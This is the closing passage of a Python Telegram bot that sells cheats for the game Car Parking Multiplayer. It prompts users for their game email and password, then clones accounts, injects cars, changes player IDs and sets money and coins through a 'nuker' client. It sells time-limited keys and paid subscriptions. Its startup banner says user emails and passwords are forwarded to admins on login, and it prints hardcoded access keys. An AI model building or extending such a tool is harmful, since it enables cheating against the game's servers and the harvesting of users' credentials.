                del user_states[chat_id]
                return
            loading_msg = bot.send_message(chat_id, "⏳ **Changing password...**", parse_mode='Markdown')
            result = run_async(nuker.change_password(web_uid, new_pass))
            if result and result.get("ok"):
                bot.edit_message_text(f"✅ **{result.get('message')}**", chat_id, loading_msg.message_id, parse_mode='Markdown')
                user_sessions[chat_id]['password'] = new_pass
            else:
                bot.edit_message_text(f"❌ **Failed to change password!**\n💀 {result.get('message', 'Unknown error')}", chat_id, loading_msg.message_id, parse_mode='Markdown')
            del user_states[chat_id]
            show_cpm1_menu(chat_id)
            return

        # ====== CPM1 - Clone Account ======
        if state.get('awaiting_clone_source_email'):
            user_sessions[chat_id]['clone_source_email'] = text.strip()
            bot.send_message(chat_id, "🔑 **Enter source account password:**", parse_mode='Markdown')
            user_states[chat_id] = {'awaiting_clone_source_pass': True}
            return
        if state.get('awaiting_clone_source_pass'):
            user_sessions[chat_id]['clone_source_pass'] = text.strip()
            bot.send_message(chat_id, "📧 **Enter target account email:**", parse_mode='Markdown')
            user_states[chat_id] = {'awaiting_clone_target_email': True}
            return
        if state.get('awaiting_clone_target_email'):
            user_sessions[chat_id]['clone_target_email'] = text.strip()
            bot.send_message(chat_id, "🔑 **Enter target account password:**", parse_mode='Markdown')
            user_states[chat_id] = {'awaiting_clone_target_pass': True}
            return
        if state.get('awaiting_clone_target_pass'):
            source_email = user_sessions[chat_id].get('clone_source_email')
            source_pass = user_sessions[chat_id].get('clone_source_pass')
            target_email = user_sessions[chat_id].get('clone_target_email')
            target_pass = text.strip()
            bot.send_message(chat_id, "⏳ **Cloning account...**\n⏱️ Please wait, this is running fast now!", parse_mode='Markdown')
            result = cpm1_clone_account(source_email, source_pass, target_email, target_pass)
            if result[0] == True:
                data = result[1]
                bot.send_message(chat_id, get_text(chat_id, "clone_success", success=data['success'], total=data['total']), parse_mode='Markdown')
            elif result[0] == "partial":
                data = result[1]
                bot.send_message(chat_id, f"⚠️ **Partial clone**\n✅ Success: {data['success']}/{data['total']}\n❌ Failed: {data['fail']}", parse_mode='Markdown')
            else:
                data = result[1]
                bot.send_message(chat_id, get_text(chat_id, "clone_fail", error=data.get('error', 'Unknown error')), parse_mode='Markdown')
            del user_states[chat_id]
            show_cpm1_menu(chat_id)
            return

        # ====== CPM1 - Unlock Cars ======
        if state.get('awaiting_unlock_email'):
            email = text.strip()
            if '@' not in email or '.' not in email:
                bot.send_message(chat_id, "❌ **Invalid email!**\n📧 Enter a valid email (e.g., user@example.com)", parse_mode='Markdown')
                return
            if chat_id not in user_sessions:
                user_sessions[chat_id] = {}
            user_sessions[chat_id]['unlock_email'] = email
            bot.send_message(chat_id, "🔑 **Enter password:**\n━━━━━━━━━━━━━━━━━━━━━\n🔐 Send password now:", parse_mode='Markdown')
            user_states[chat_id] = {'awaiting_unlock_pass': True}
            return
        if state.get('awaiting_unlock_pass'):
            password = text.strip()
            email = user_sessions[chat_id].get('unlock_email')
            if not email:
                bot.send_message(chat_id, "❌ **Error: Email missing! Start over.**", parse_mode='Markdown')
                del user_states[chat_id]
                show_cpm1_menu(chat_id)
                return
            loading_msg = bot.send_message(chat_id, "⏳ **Verifying account...**", parse_mode='Markdown')
            token, uid = verify_user(email, password)
            if not token:
                bot.edit_message_text("❌ **Invalid credentials!** Check email and password.", chat_id, loading_msg.message_id, parse_mode='Markdown')
                if 'unlock_email' in user_sessions[chat_id]:
                    del user_sessions[chat_id]['unlock_email']
                del user_states[chat_id]
                show_cpm1_menu(chat_id)
                return
            user_sessions[chat_id]['unlock_pass'] = password
            user_sessions[chat_id]['unlock_token'] = token
            user_sessions[chat_id]['unlock_uid'] = uid
            bot.edit_message_text(get_text(chat_id, "unlock_cars_prompt", email=email), chat_id, loading_msg.message_id, reply_markup=create_unlock_cars_keyboard(chat_id), parse_mode='Markdown')
            del user_states[chat_id]['awaiting_unlock_pass']
            return
        if state.get('awaiting_unlock_manual_cid'):
            try:
                cid = int(text.strip())
                email = user_sessions[chat_id].get('unlock_email')
                password = user_sessions[chat_id].get('unlock_pass')
                if not email or not password:
                    bot.send_message(chat_id, "❌ **Missing data! Start over.**", parse_mode='Markdown')
                    del user_states[chat_id]
                    show_cpm1_menu(chat_id)
                    return
                loading_msg = bot.send_message(chat_id, f"⏳ **Injecting car {cid}...**", parse_mode='Markdown')
                result = cpm1_clone_single_car(email, password, cid)
                if result:
                    bot.edit_message_text(f"✅ **Car {cid} unlocked!**\n🎨 Vinyl design included — check your garage in-game!", chat_id, loading_msg.message_id, parse_mode='Markdown')
                else:
                    bot.edit_message_text(f"❌ **Failed to unlock car {cid}!**\n💀 Make sure the car ID is valid (0-270).\n🔁 You can try again or pick a different ID.", chat_id, loading_msg.message_id, parse_mode='Markdown')
                bot.send_message(chat_id, get_text(chat_id, "unlock_cars_prompt", email=email), reply_markup=create_unlock_cars_keyboard(chat_id), parse_mode='Markdown')
                del user_states[chat_id]['awaiting_unlock_manual_cid']
            except ValueError:
                bot.send_message(chat_id, "❌ **Invalid number!** Must be a number.", parse_mode='Markdown')
            return

        # ====== CPM1 - Change ID ======
        if state.get('awaiting_change_id'):
            new_id = text.strip().upper()
            if not new_id:
                bot.send_message(chat_id, "❌ **ID cannot be empty!**", parse_mode='Markdown')
                return
            web_uid = user_sessions[chat_id].get('web_uid')
            if not web_uid:
                bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
                del user_states[chat_id]
                return
            result = run_async(nuker.change_player_id(web_uid, new_id))
            if result and result.get("ok"):
                bot.send_message(chat_id, get_text(chat_id, "id_changed", new_id=new_id), parse_mode='Markdown')
            else:
                bot.send_message(chat_id, get_text(chat_id, "id_fail") + f"\n💀 {result.get('message', '')}", parse_mode='Markdown')
            del user_states[chat_id]
            show_cpm1_menu(chat_id)
            return

        # ====== CPM1 - Add Money ======
        if state.get('awaiting_money'):
            try:
                amount = int(text.strip().replace(',', '').replace('_', ''))
                if amount <= 0:
                    bot.send_message(chat_id, "❌ **Amount must be greater than 0!**", parse_mode='Markdown')
                    return
                if amount > MAX_MONEY:
                    bot.send_message(chat_id, f"⚠️ **Maximum is {MAX_MONEY:,}**", parse_mode='Markdown')
                    return
            except ValueError:
                bot.send_message(chat_id, "❌ **Enter a valid number!**", parse_mode='Markdown')
                return
            web_uid = user_sessions[chat_id].get('web_uid')
            if not web_uid:
                bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
                del user_states[chat_id]
                return
            result = run_async(nuker.set_money(web_uid, amount))
            if result and result.get("ok"):
                bot.send_message(chat_id, get_text(chat_id, "money_added", amount=f"{amount:,}"), parse_mode='Markdown')
            else:
                bot.send_message(chat_id, get_text(chat_id, "money_fail") + f"\n💀 {result.get('message', '')}", parse_mode='Markdown')
            del user_states[chat_id]
            show_cpm1_menu(chat_id)
            return

        # ====== CPM1 - Add Coins ======
        if state.get('awaiting_coin'):
            try:
                amount = int(text.strip().replace(',', '').replace('_', ''))
                if amount <= 0:
                    bot.send_message(chat_id, "❌ **Amount must be greater than 0!**", parse_mode='Markdown')
                    return
                if amount > MAX_COIN:
                    bot.send_message(chat_id, f"⚠️ **Maximum is {MAX_COIN:,}**", parse_mode='Markdown')
                    return
            except ValueError:
                bot.send_message(chat_id, "❌ **Enter a valid number!**", parse_mode='Markdown')
                return
            web_uid = user_sessions[chat_id].get('web_uid')
            if not web_uid:
                bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
                del user_states[chat_id]
                return
            result = run_async(nuker.set_coin(web_uid, amount))
            if result and result.get("ok"):
                bot.send_message(chat_id, get_text(chat_id, "money_added", amount=f"{amount:,} Coins"), parse_mode='Markdown')
            else:
                bot.send_message(chat_id, get_text(chat_id, "money_fail") + f"\n💀 {result.get('message', '')}", parse_mode='Markdown')
            del user_states[chat_id]
            show_cpm1_menu(chat_id)
            return

        # ====== Admin: Time Key - Create ======
        if state.get('awaiting_time_key_hours'):
            if not is_admin(chat_id):
                del user_states[chat_id]
                return
            try:
                hours = int(text.strip())
                if hours <= 0:
                    bot.send_message(chat_id, "❌ **Must be greater than 0!**", parse_mode='Markdown')
                    return
                if hours > 720:
                    bot.send_message(chat_id, "⚠️ **Maximum 720 hours (30 days)**", parse_mode='Markdown')
                    return
                new_key = create_time_key(hours, chat_id)
                bot.send_message(chat_id, f"✅ **Key created!**\n━━━━━━━━━━━━━━━━━━━━━\n🔑 `{new_key}`\n⏱️ Duration: {hours} hours\n📅 Expires: {(datetime.now() + timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')}\n━━━━━━━━━━━━━━━━━━━━━\n📌 Send this key to the user", parse_mode='Markdown')
                notify_admins(
                    f"⏰ **Time Key Created**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔑 Key: `{new_key}`\n"
                    f"⏱️ Duration: {hours} hours\n"
                    f"👤 By: `{chat_id}`\n"
                    f"📅 Expires: {(datetime.now() + timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except ValueError:
                bot.send_message(chat_id, "❌ **Enter a valid number!**", parse_mode='Markdown')
            del user_states[chat_id]
            admin_panel(message)
            return

        # ====== Admin: Time Key - Delete ======
        if state.get('awaiting_time_key_delete'):
            if not is_admin(chat_id):
                del user_states[chat_id]
                return
            key = text.strip()
            if key in TIME_KEYS:
                del TIME_KEYS[key]
                bot.send_message(chat_id, f"✅ **Deleted key `{key}`**", parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "❌ **Key not found!**", parse_mode='Markdown')
            del user_states[chat_id]
            admin_panel(message)
            return

        # ====== Admin: Broadcast ======
        if state.get('awaiting_broadcast'):
            if not is_admin(chat_id):
                del user_states[chat_id]
                return
            count = 0
            for user_id in total_users:
                try:
                    bot.send_message(user_id, f"📢 **Broadcast from Admin**\n\n{text}", parse_mode='Markdown')
                    count += 1
                    time.sleep(0.05)
                except Exception:
                    pass
            bot.send_message(chat_id, f"✅ **Sent to {count} users**", parse_mode='Markdown')
            del user_states[chat_id]
            admin_panel(message)
            return

        # ====== Admin: Manage Keys ======
        if state.get('awaiting_add_key'):
            if not is_admin(chat_id):
                del user_states[chat_id]
                return
            key = text.strip()
            if key not in ALLOWED_KEYS:
                ALLOWED_KEYS.append(key)
                bot.send_message(chat_id, f"✅ **Added `{key}`**", parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "❌ **Key already exists!**", parse_mode='Markdown')
            del user_states[chat_id]
            admin_panel(message)
            return
        if state.get('awaiting_delete_key'):
            if not is_admin(chat_id):
                del user_states[chat_id]
                return
            key = text.strip()
            if key in ALLOWED_KEYS:
                ALLOWED_KEYS.remove(key)
                bot.send_message(chat_id, f"✅ **Deleted `{key}`**", parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "❌ **Key not found!**", parse_mode='Markdown')
            del user_states[chat_id]
            admin_panel(message)
            return

        # ====== Admin: Ban / Unban ======
        if state.get('awaiting_ban'):
            if not is_admin(chat_id):
                del user_states[chat_id]
                return
            try:
                user_id = int(text.strip())
                banned_users.add(user_id)
                bot.send_message(chat_id, f"🚫 **Banned `{user_id}`**", parse_mode='Markdown')
            except Exception:
                bot.send_message(chat_id, "❌ **Invalid user ID!**", parse_mode='Markdown')
            del user_states[chat_id]
            admin_panel(message)
            return
        if state.get('awaiting_unban'):
            if not is_admin(chat_id):
                del user_states[chat_id]
                return
            try:
                user_id = int(text.strip())
                banned_users.discard(user_id)
                bot.send_message(chat_id, f"✅ **Unbanned `{user_id}`**", parse_mode='Markdown')
            except Exception:
                bot.send_message(chat_id, "❌ **Invalid user ID!**", parse_mode='Markdown')
            del user_states[chat_id]
            admin_panel(message)
            return

    if text and text.startswith('/'):
        return
    if not is_banned(chat_id) and check_subscription(chat_id):
        bot.send_message(chat_id, "❌ **Unknown command!**", parse_mode='Markdown')

# ═══════════════════════════════════════════════════════════
# 🚀 BOT START
# ═══════════════════════════════════════════════════════════

def _enforce_single_instance():
    """Kill any older copy of this bot running on the same machine (prevents
    Telegram 409 'terminated by other getUpdates request' errors on Render)."""
    my_pid = os.getpid()
    try:
        myself = []
        try:
            # Linux: /proc/*/cmdline is the most reliable way
            for pid_dir in os.listdir('/proc'):
                if not pid_dir.isdigit():
                    continue
                pid = int(pid_dir)
                if pid == my_pid:
                    continue
                cmdline_path = f'/proc/{pid}/cmdline'
                try:
                    with open(cmdline_path, 'rb') as f:
                        cmdline = f.read().replace(b'\x00', b' ').decode(errors='ignore')
                    # Match python bot.py processes with same script name
                    if 'bot.py' in cmdline and 'python' in cmdline:
                        myself.append(pid)
                except (PermissionError, FileNotFoundError, ProcessLookupError):
                    continue
        except Exception:
            pass
        for pid in myself:
            try:
                os.kill(pid, signal.SIGTERM)
                print(f"🔪 Stopped older bot instance (PID {pid})")
            except (ProcessLookupError, PermissionError):
                pass
        # Give old instances a moment to release polling
        if myself:
            time.sleep(3)
    except Exception as e:
        print(f"⚠️ Single-instance check skipped: {e}")

def _start_flask_background():
    """Start Flask in a background daemon thread so the main process is never
    blocked by the web server (prevents Render status 143 exits)."""
    global flask_thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    port = int(os.environ.get('PORT', 10000))
    print(f"🌐 Flask health server started in background (port {port})")

if __name__ == "__main__":
    # Ensure only ONE bot instance is running (prevents Telegram 409 Conflict)
    _enforce_single_instance()

    # Start the health-check web server in the background
    _start_flask_background()
    print("="*60)
    print("MARKMWEHEHETOOL BOT - CPM1 + CPM2 ULTIMATE")
    print("="*60)
    print("✅ Bot is running!")
    print("👑 Admins: 6531314640, 8650959684")
    print("🔑 Keys: MARKMWEHEHETOOL7077, MARKK, TANNER")
    print("⏰ Time Keys: Supported (Admin can create keys with custom hours)")
    print("🎁 Free Trial: Supported (10 minutes)")
    print("📱 CPM1:")
    print("   - Old (Cloning, Car Unlock): from old code")
    print("   - New (W16, Horns, Fuel, Damage, Smoke, etc): from CPMNuker")
    print("🎮 CPM2: from old code (working)")
    print("📊 Key Tracking: Active (No duplicate users per key)")
    print("📢 Admin Notifications: Active (Email + Password on login)")
    print("🔄 Refresh Account: Fixed (Force refresh from server)")
    print("🌐 Language: English Only")
    print("🔥 Firebase Logging: ACTIVE")
    print("📥 /download_logs - View cloud logs summary")
    print("💾 /backup_now - Download full backup")
    print("📊 /dashboard - Admin dashboard with stats")
    print("💎 Subscription System: FULLY WORKING")
    print("🌟 Stars Payment: AUTOMATIC activation (no admin confirm)")
    print("🌟 Stars Balance: tracked in stars_balance.json (/stars to view)")
    print("⏰ Auto Expiry: User gets renewal message when subscription expires")
    print("="*60)

    # Drop any leftover updates/webhook so this instance starts with a clean slate
    try:
        bot.delete_webhook(drop_pending_updates=True)
        print("🧹 Webhook cleared, pending updates dropped")
    except Exception as e:
        print(f"⚠️ Webhook cleanup: {e}")

    print("🚀 Starting long-polling (bot will stay alive 24/7)...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=20)
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)
